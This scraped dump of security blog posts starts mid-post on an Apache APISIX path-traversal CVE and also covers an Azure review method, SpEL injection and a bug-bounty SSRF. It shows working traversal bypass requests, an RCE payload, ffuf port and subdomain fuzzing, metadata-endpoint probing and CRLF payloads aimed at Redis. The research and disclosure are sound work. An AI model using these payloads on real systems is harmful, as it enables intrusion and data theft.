--namespace ingress-apisix \\  --version 0.7.2 kubectl get service --namespace ingress-apisix   In case of problems follow official guide.\nTo create ingress route, you need to deploy ApisixRoute resource:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  apiVersion:apisix.apache.org/v2beta1kind:ApisixRoutemetadata:name:public-service-routespec:http:- name:public-service-rulematch:hosts:- app.testpaths:- /public-service/*backends:- serviceName:public-serviceservicePort:8080plugins:- name:proxy-rewriteenable:trueconfig:regex_uri:[\u0026#34;/public-service/(.*)\u0026#34;,\u0026#34;/$1\u0026#34;]- name:protected-service-rulematch:hosts:- app.testpaths:- /protected-service/*backends:- serviceName:protected-serviceservicePort:8080plugins:- name:uri-blockerenable:trueconfig:block_rules:[\u0026#34;^/protected-service(/?).*\u0026#34;]case_insensitive:true- name:proxy-rewriteenable:trueconfig:regex_uri:[\u0026#34;/protected-service/(.*)\u0026#34;,\u0026#34;/$1\u0026#34;]  Let\u0026rsquo;s dive deep into it:\n it creates routes for public-service and private-service there is proxy-rewrite turned on to remove prefixes there is uri-blocker plugin configured for protected-service. It can look like mistake but this plugin it about to block any requests starting with /protected-service üòÄ  Exploitation I\u0026rsquo;m using APISIX in version 2.10.0.\nReaching out to APISIX routes in minikube is quite inconvenient: kubectl exec -it -n ${namespace of Apache APISIX} ${Pod name of Apache APISIX} -- curl --path-as-is http://127.0.0.1:9080/public-service/public -H 'Host: app.test'. To ease my pain I will write small script that will work as template:\n1 2 3  #/bin/bash kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H \u0026#39;Host: app.test\u0026#39;   In your case replace apisix-dc9d99d76-vl5lh with name of actual APISIX pod.\nLet\u0026rsquo;s start with validation if routes and plugins are working as expected:\n1 2 3  $ ./apisix_request.sh \u0026#34;/public-service/public\u0026#34; Defaulted container \u0026#34;apisix\u0026#34; out of: apisix, wait-etcd (init) {\u0026#34;data\u0026#34;:\u0026#34;public data\u0026#34;}   1 2 3 4 5 6 7 8 9  $ ./apisix_request.sh \u0026#34;/protected-service/protected\u0026#34; Defaulted container \u0026#34;apisix\u0026#34; out of: apisix, wait-etcd (init) \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;403 Forbidden\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;openresty\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Yep. public-service is available and protected-service is blocked by plugin.\nNow let\u0026rsquo;s test payloads:\n1 2 3  $ ./apisix_request.sh \u0026#34;/public-service/../protected-service/protected\u0026#34; Defaulted container \u0026#34;apisix\u0026#34; out of: apisix, wait-etcd (init) {\u0026#34;data\u0026#34;:\u0026#34;protected data\u0026#34;}   and second one:\n1 2 3  $ ./apisix_request.sh \u0026#34;/public-service/..%2Fprotected-service/protected\u0026#34; Defaulted container \u0026#34;apisix\u0026#34; out of: apisix, wait-etcd (init) {\u0026#34;data\u0026#34;:\u0026#34;protected data\u0026#34;}   As you can see in both cases I was able to bypass uri restrictions üòÑ\nRoot cause uri-blocker plugin is using ctx.var.request_uri variable in logic of making blocking decision. You can check it in code:\n Impact  attacker can bypass access control restrictions and perform successful access to routes that shouldn\u0026rsquo;t be able to, developers of custom plugins have no knowledge that ngx.var.request_uri variable is untrusted.  Search for usage of var.request_uri gave me a hint that maybe authz-keycloak plugin is affected. You can see this code, it looks really nasty. If there is no normalization on keycloak side, then there is high potential for vulnerablity.\nMitigation In case of custom plugins, I suggest to do path normalization before using ngx.var.request_uri variable. There are also two other variables, high probably normalized, to check ctx.var.upstream_uri and ctx.var.uri.\nSkipper Skipper is another ingress controller that I have investigated. It\u0026rsquo;s not easy to install it in kubernetes, because deployment guide and helm charts are outdated. Luckily I have found issue page where developer was describing how to install it. This ingress gives possibility to implement external authentication based on webhook filter:\n1 2 3 4 5 6 7  apiVersion:networking.k8s.io/v1kind:Ingressmetadata:name:my-ingressannotations:zalando.org/skipper-filter:|modPath(\u0026#34;^/.*/\u0026#34;, \u0026#34;/\u0026#34;) -\u0026gt; setRequestHeader(\u0026#34;X-Auth-Request-Redirect\u0026#34;, \u0026#34;${request.path}\u0026#34;) -\u0026gt; webhook(\u0026#34;http://auth-service.default.svc.cluster.local:8080/verify\u0026#34;)  To add some interesting headers that could help in access control decision, you need to do it manually with setRequestHeader filter. There is template available to inject variable by ${}. Sadly (for attackers) ${request.path} is having normalized path üòê I see in code that developers are not using easily RequestURI or originalRequest.\nI wasn\u0026rsquo;t able to exploit path traversal in this case. Skipper remains safe.\nSummary Apache APISIX is vulnerable for path traversal. It\u0026rsquo;s not affecting any external authentication, but plugins that are using ctx.var.request_uri variable.\nWhole code of this example is here https://github.com/xvnpw/k8s-CVE-2021-43557-poc.\nOther articles from this series  Path traversal in authorization context in Traefik and HAProxy Path traversal in authorization context in Emissary Path traversal in authorization context in Kong and F5 NGINX Bug bounty tips for nginx $request_uri path traversal bypass Hunting for buggy authentication/authorization services on github   Thanks for reading! You can follow me on Twitter.\n","date":"2021-11-22T20:59:02+01:00","permalink":"https://xvnpw.github.io/posts/cve_2021_43557_apache_apisix_path_traversal_in_request_uri_variable/","title":"CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable"},{"content":"{{ template \u0026ldquo;_internal/google_analytics.html\u0026rdquo; . }}\nLately I have come across task to perform security review of Azure subscription. It was white-box based and I had access to all terraform, Kubernetes and Docker files. I will share with you what checks are worth to do for such review.\n My methodology Number of resources to check may vary from project to project. For me best approach is to mix automated tools with manual work. If it\u0026rsquo;s possible I\u0026rsquo;m using two tools for same purpose. It makes my life easier as I don\u0026rsquo;t need to choose best tool üôÇ It\u0026rsquo;s also improving results.\nI categorize findings into groups:\n Critical‚Ää-‚Ääneed to contact team and fix immediately High‚Ää-‚Ääneed to be fixed by team Medium‚Ää-‚Äänice to be fixed Low‚Ää-‚Ääleast important to fix  0¬∫ Scope definition Before starting any actual work, we need to define scope. In many cases it will directly come from team that created resources in Azure. In that case schedule meeting with them and note all important information:\n what is name of Azure subscription to test (you don\u0026rsquo;t want to review wrong one!) what is usage of subscription: e.g. production environment for web application¬†? link to repository with terraform/Kubernetes/Docker files any diagrams reflecting how components are communicating, e.g. UML component diagram or network schema ask team to go briefly with Azure resources description‚Ää-‚Ääno need to be detailed at this point what is team priority for review‚Ää-‚Ääthis is quite important question. On one hand it shows expectations from team, but also can potentially reveal strong and weak sides of configuration. establish with team way to contact during review. This time you can give some your expectations, e.g. do status meetings daily and contact immediately on critical findings.  1¬∫ Turn on Azure¬†Defender Now it\u0026rsquo;s finally time to go into Azure portal.\nAt beginning my first steps are into Security Center to turn on paid version of it (currently named Azure Defender). This will do additional scanning and give results of regulatory compliance, e.g. ISO 27001, PCI DSS. Generally speaking this paid version should be turned on already at this point as it\u0026rsquo;s giving a lot into cloud security.\nSecurity Center is based in some part on logs coming from agents, so let\u0026rsquo;s give it some time to run.\n2¬∫ Manual¬†check Having head full of knowledge from scope definition it\u0026rsquo;s time to get familiar with target subscription. This step is based more on intuition than strictly technical. Try to go from resource to resource checking network and security configuration. If something is having \u0026ldquo;bad smell\u0026rdquo; just follow it to clarify for 100% whether is good or not. Typically I look for:\n open Storage Accounts open ports in Network Security Groups (NSGs) not protected Virtual Machines misconfiguration in deployed services: databases, Elasticsearch, Redis, etc. wrong or to permissive RBAC roles assignment  3¬∫ Terraform files¬†check If you are lucky and team is using Infrastructure as a Code, you can test it with automated tools. There are good in finding typical misconfiguration. For terraform I\u0026rsquo;m using two:\n https://github.com/bridgecrewio/checkov https://github.com/tfsec/tfsec  4¬∫ Kubernetes deployments check Kubernetes files also can be checked with automated tools. The other way is to check configuration by deploying audit application into cluster. It has benefits as it constantly reporting. It can be running after audit to make team aware about problems.\nIn my case, I was checking Helm scripts. If you don\u0026rsquo;t know Helm, it\u0026rsquo;s templating language for Kubernetes. In order to check template I needed first to generate Kubernetes files based on template and values. For most simple case you need to run:\n1  helm template review¬†./ \u0026gt; output.yaml   I have choose checkov to test Kubernetes files:\n1  checkov --quiet -f output.yaml \u0026gt; checkov.result.txt   Second tool that I recommending is kube-scan deployed into cluster:\n1 2 3 4  az login az aks get-credentials -resource-group myResourceGroup -name myAKSCluster kubectl apply -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml kubectl -n kube-scan get service kube-scan-ui   5¬∫ Docker¬†check Dockerfiles can have misconfiguration and docker container can have vulnerabilities, e.g. outdated system packages.\nFor checking Dockerfiles I used https://github.com/hadolint/hadolint:\n1  docker run --rm -i hadolint/hadolint \u0026lt; Dockerfile   and for docker containers https://github.com/anchore/anchore-engine:\n 6¬∫ Complex security audit¬†tool Last step in checking is based on tool that is doing complex whole subscription check based on numerous rules, mostly coming from CIS Benchmarks.\nThe only tool worth mention that I have found is https://github.com/nccgroup/ScoutSuite. It can check not only Azure but also AWS and GCP.\nI had problem in running ScoutSuite on my local machine, so I did run it eventually on Docker. Problem was related to my version of python.\n 7¬∫ Writing report (if not did¬†yet) Best way to write report is to do it during review. So that you can take screenshots along the way.\nSummary I must say that I\u0026rsquo;m enjoying this kind of tasks in my work üôÇ There are good tools and in most cases running smoothly. Biggest problems I had in playing with anchor and ScoutSuite.\nFindings? In my case there were some critical one. Sadly team didn\u0026rsquo;t spot right recommendations in Azure Security Center on time. Monitoring those recommendations manually is not easy for development teams. Good thing is that Azure is giving some options for notifications.\nPlease share in comments your ideas about Azure review. What tools are good for you?\n Thanks for reading! You can follow me on Twitter.\n","date":"2021-02-01T10:14:47+01:00","permalink":"https://xvnpw.github.io/posts/azure-subscription-security-review/","title":"Azure subscription security¬†review"},{"content":"This story will explain how to find and exploit SpEL parser in web applications based on Java language.\nWhat is SpEL¬†? From Spring documentation:\n The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime.\n Where is it used¬†?\n Spring Framework: Security, Data,¬†‚Ä¶ Any place developers use it by SpEL API For languages it can be used in Java, Kotlin, Scala, and other JVM based technologies.  First point is known by issues in past like: CVE-2018‚Äì1273, CVE-2017‚Äì8046 or CVE-2011‚Äì2730. I will not talk about them, I will focus on point number two.\nSpEL API Most common use cases for SpEL that I have seen in web applications:\n complex expressions using custom function calls: fun1(\u0026quot;some string\u0026quot;)¬†? \u0026quot;text\u0026quot;¬†: fun2(\u0026quot;some other string\u0026quot;) dynamic code evaluation: T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec‚Ä¶  Any of user input can be part of expression. Also input can be expression as a whole. Those above use cases are good indicators what to look for in web apps. Key words: expression, mapping, dynamic üòÉ\nPayloads From you have already see I bet you know what is coming. If developers are using SpEL with user input, we need to create payload with injection. Let\u0026rsquo;s check one that allow remote code execution (RCE). It was created as part of exploit for CVE-2017‚Äì8046.\n It consist of 3 parts:\n black color‚Ää-‚Ääcopy result of command execution directly to output stream of HTTP request red color‚Ää-‚Ääget Java Runtime and execute command in system blue color‚Ää-‚ÄäString containing command: cmd /c dir. To make it more robust individual characters of command are decoded from numbers.  Result of executing it:\n Code of intentionally vulnerable web application:\n Keep in mind:\n payload is working in some of Blind scenarios‚Ää-‚Ääalways copy result to HTTP response can be tune to work on Linux‚Ää-‚Ääjust remove cmd /c and it should work out-of-box in real world you will need probably first break out of string to inject this or do other tricks that are common for injection attacks it can be used with multiple versions of String Framework and Java  Here is payload to copy:\n The other interesting payload is this one:\n It\u0026rsquo;s far less complicated but short and powerful. It\u0026rsquo;s also not using T(...) syntax and no constructor is used. It\u0026rsquo;s just executing methods and accessing properties. I will show in next part why it does matter.\nCheck more payloads for SpEL in my repository: https://github.com/xvnpw/hacking/blob/master/payloads/spel-injections.txt\nSummary That will be all for this part. I have explained what is SpEL API and how to exploit it. In next part I will deep dive into Spring source code to show how exactly it works.\n Thanks for reading! You can follow me on Twitter.\n","date":"2020-07-17T10:14:47+01:00","permalink":"https://xvnpw.github.io/posts/hacking-spel/","title":"Hacking SpEL"},{"content":"This is last part of my stories about exploiting service with SSRF bug. Part 1 is available here, and part 2 here.\nThis part is focused on abusing Node.js and node-fetch library. I will try to \u0026ldquo;talk\u0026rdquo; with Redis service using CRLF injection in http parser.\nFor convenience Redis service will be simulated by nc -vvlp 6379.\nTest environment from my Kali 2020.1b:\n Node.js version 10.19.0 node-fetch version 2.6.0  CRLF Injection Lets start with PayloadsAllTheThings. It contains couple of CRLF Injection payloads. I will loop over them and check result in second console:\n None success here. All payloads failed üôÅ\nNext step is to check payloads from two great articles by Orange Tsai: first from Red Hat 2017 and second from his blog. It\u0026rsquo;s giving few more options to test:\n1 2 3  ÔºçÔºäSet-Cookie:injectionÔºçÔºä (Unicode U+FF0D U+FF0A) http://0\\r\\n SET foo 0 60 5\\r\\n :6379/ https://0\\r\\nSET foo 0 60 5\\r\\n:6379/   Still no success here. I seams that this version of Node.js is not vulnerable for CRLF attacks.\nLet\u0026rsquo;s try harder and dig dipper into node-fetch, maybe something interesting will be in code üòÉ\nInvestigation of node-fetch code What am I trying to achieve here? I have in mind two types of possible errors:\n Url parsing Handling url input as object not as string  Let\u0026rsquo;s see what I will find.\nDebug of Node.js code is quite nice with Visual Studio Code:\n Problem number one is not existing as node-fetch is using standard Node.js Url.parse for input. There are not doing much fancy stuff with it.\nFor second problem I needed to do more investigation.\nFirst of all I will explain why I\u0026rsquo;m interested in processing object instead of string. In many dynamic languages you can make valid request like this:\nhttp://localhost:3000/c?url[href]=localhost\u0026amp;url[method]=POST\nThis leads to created object instead of string. Could be quite handy for some scenarios. Especially if developers didn\u0026rsquo;t predict it üòÉ See below example of parsing such url in Node.js Express framework.\n In node-fetch I have found one possible attacking vector:\n It look like possible to use object instead of string for input parameter. This input.method could change method type in some specific conditions. After spending some time in debugger it turn out as dead end.\nSummary I didn\u0026rsquo;t manage to escalate blind SSRF to anything more. I have spent couple of days trying different approaches. Nevertheless after submitting report I was awarded with 400$ and bug was marked as medium.\n Thanks for reading! You can follow me on Twitter.\n","date":"2020-07-07T10:14:47+01:00","permalink":"https://xvnpw.github.io/posts/from-dot-in-regex-to-ssrf-part-3/","title":"From . in regex to SSRF‚Ää-‚Ääpart 3"},{"content":"In this story I will continue my journey to exploit Server Side Request Forgery (SSRF). Part 1 is available here.\nWhat is state of the game up to now? I have found service that is vulnerable to SSRF by executing the REST call and by passing domain name check:\nhttps://api.example.org/image-converter/https://www-example.org\nI have registered domain name: www-example.org and add for it CNAME record to my EC2 server.\nBut wait a second. This is not yet \u0026ldquo;SSRF\u0026rdquo;. For now I could call specific domain, but didn\u0026rsquo;t prove ability to scan internal ports or execute requests to internal services.\nFirst of all I checked what headers are sent to my server:\n1  nc -l -n -p 80    What it interesting here is User-Agent. Clearly indicating NodeJS and node-fetch library.\nTools For this part I needed http server to host some files and do redirects. Here is my script based on python http.server:\n This script is doing two things:\n if request is starting with query parameter /?r= it is taking value of this parameter and put it in Location header, returning code 302 else it is loading file from disk and always returning image/svg+xml with code 200. This is important! Always return expected Content-Type to check if parser can handle different types.  This code is PoC so don\u0026rsquo;t expect much out of it. It\u0026rsquo;s for testing purpose only. Don't use it on production.\nYou can check more of my hacking resources in my public repo.\nMind map Here is mind map of ideas that I had during exploitation:\n SVG payload Hosting some svg files was my first shot. I have took some from PayloadsAllTheThings repository, but sadly none was working.\nIn most cases I got 502 Bad Gateway and in some payloads were just ignored. The other thing I noticed is that I was able request png or jpg file and it was parsed. I have gut feeling that service was using some kind of NodeJS library, not ImageMagick. Maybe I did miss something?\nHTTP Redirect I have implemented in my server.py possibility to redirect with new Location header. This created variety of options to exploit.\nLets start with ports scanning:\nhttps://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2F127.0.0.1%3A80%2F\nRedirect part is url encoded to not break service with¬†? or /. I have taken this to Burp Intruder and scan all ports. But if you are using free version of Burp this can take a very long time. So it\u0026rsquo;s better to use ffuf:\n1 2  for i in {1..65535}; do echo $i; done \u0026gt; all_ports.txt; ffuf -mc all -ac -w all_ports.txt -u \u0026#39;https://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2F127.0.0.1%3AFUZZ%2F\u0026#39;   Same way I was able to scan for internal services. For list of domains I used SecLists:\n1  ffuf -mc all -ac -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u \u0026#39;https://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2FFUZZ.example.org%2F\u0026#39;   This will try to make a call to subdomains of example.org but from perspective of api.example.org. In my case it found redis instance on redis.example.org.\nNext step for me was access cloud resources, e.g. metadata services on 169.254.169.254:\nhttps://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2F169.254.169.254%3A80%2F\nI was able to positively connect to 169.254.169.254. So it means that service was running on AWS.\nSummary I finally got blind SSRF using redirect 302 code and Location header! That\u0026rsquo;s gave me possibility to penetrate internal network. I was disappointed that no svg payload was working. For part 3 I left \u0026ldquo;HTTP Parser Abuse\u0026rdquo;‚Ää-‚ÄäI will try to force node-fetch to change protocol and talk with services like redis.\n Thanks for reading! You can follow me on Twitter.\n","date":"2020-01-14T10:14:47+01:00","permalink":"https://xvnpw.github.io/posts/from-dot-in-regex-to-ssrf-part-2/","title":"From¬†. in regex to SSRF‚Ää-‚Ääpart¬†2"},{"content":" In test of one application I have encountered bug in regex that leaded to Server Side Request Forgery (SSRF). Way of finding it was huge fun and excitement. It was also my first bug on production system ever.\nDuring a recon I have found service called image-converter. It was definitely interesting, but not straight forward to exploit. I had no example of usage it and on simple GET request I was just getting:\n That was first major problem for me. I was trying with some simple query parameters like:\n ?url= ?width= ?name=  and so on but without luck. Then I tried with https://github.com/s0md3v/Arjun which is tool for automated parameter discovery. This also failed. I was pretty sure that there is something out there, but I couldn\u0026rsquo;t force it to work.\nThen I started digging in what is this error message that I see all the time: \u0026quot;Cannot read property 'groups' of null\u0026quot;. This leads me to stackoverflow question about JavaScript and regex error. After that I was wondering: \u0026ldquo;How the hell they have implemented this?\u0026rdquo;. After hour of trying and failure, I got it:\nhttps://api.example.org/image-converter/width=100/http://google.com\n In my almost 10 years IT career, I didn\u0026rsquo;t see service implementation like that¬†üòâ\nMy positive energy went down, as I realized that there is domain whitelisting implemented. I have picked main domain www.example.org and in fact it was working:\nhttps://api.example.org/image-converter/width=100/https://www.example.org\nI got response:\n In this moment I was sure about SSRF, but still had whitelisting to bypass.\nMy first approach was to take SSRF from PayloadAllTheThings and test it. I don\u0026rsquo;t want to copy all that here. There is dozen of payloads. Sadly not of it worked. I got very interested in Orange: A New Era SSRF, but that was also death end.\nI was pretty puzzled. Having high hope on some nice bug, but it looked like this service was secured. Good thing was that I have learned a lot, especially from Orange paper.\nNext day with fresh head I took different way. During recon I have noted two other domains connected with main one: www.example.net and www.example.com. It turn out that those domains where also whitelisted. Having a background in programming I knew that developers have a tendency to write \u0026ldquo;nice code\u0026rdquo;, so maybe they used regex to check domain suffix? And guess what? They did! For request:\nhttps://api.example.org/image-converter/width=100/https://www-example.org\nI got response:\n Hurray!\nWhat exactly regex they used¬†? I think something like this regex101:\n And what they should use is: www\\.example\\.(com|net|org)\nNext I have registered www-example.com domain and started playing with escalation this. More about it in part 2.\n Thanks for reading! You can follow me on Twitter.\n","date":"2020-01-05T10:14:47+01:00","permalink":"https://xvnpw.github.io/posts/from-dot-in-regex-to-ssrf-part-1/","title":"From¬†. in regex to SSRF‚Ää-‚Ääpart¬†1"}]